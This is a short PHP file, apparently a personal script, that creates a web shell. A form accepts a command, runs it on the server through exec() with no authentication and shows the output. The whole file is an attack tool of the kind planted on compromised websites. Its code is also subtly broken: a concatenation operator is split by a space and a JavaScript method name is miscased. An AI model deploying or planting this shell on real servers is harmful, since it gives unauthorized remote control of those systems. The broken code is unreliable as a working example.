#!/usr/bin/php
#=========================================================================================
# shell.php
# Ronald Wochner 
# Sat Jun  3 21:02:42 PDT 2017
# Version 1
# Simple php script to create a php shell. 
#=========================================================================================

<?php
if($_POST['command'])
{
    if($_POST['out'])
    {
        $out = $_POST['out'] . "\n";
        if(strlen($out) > 2000)
        {
            $out = substr($out,strlen($out) - 2000,2000);
        }
    }
    $out . = " > {$_POST['command']}\n";
    exec($_POST['command'],$data);
    $out . = implode("\n",$data);
}
?>

<FORM METHOD = POST>
<TEXTAREA NAME = out id = out style="width: 100%; height:90%">
<?php echo $out?>
</TEXTAREA><BR>
Input Command: <INPUT NAME = command id = command TYPE=TEXT LENGTH=255>
<INPUT TYPE=SUBMIT>
</FORM>

<script>
var ta = document.getElementByID('out');
ta.scrollTop = ta.scrollHeight;
var cmd = document.getElementById('command');
cmd.focus();
</script>

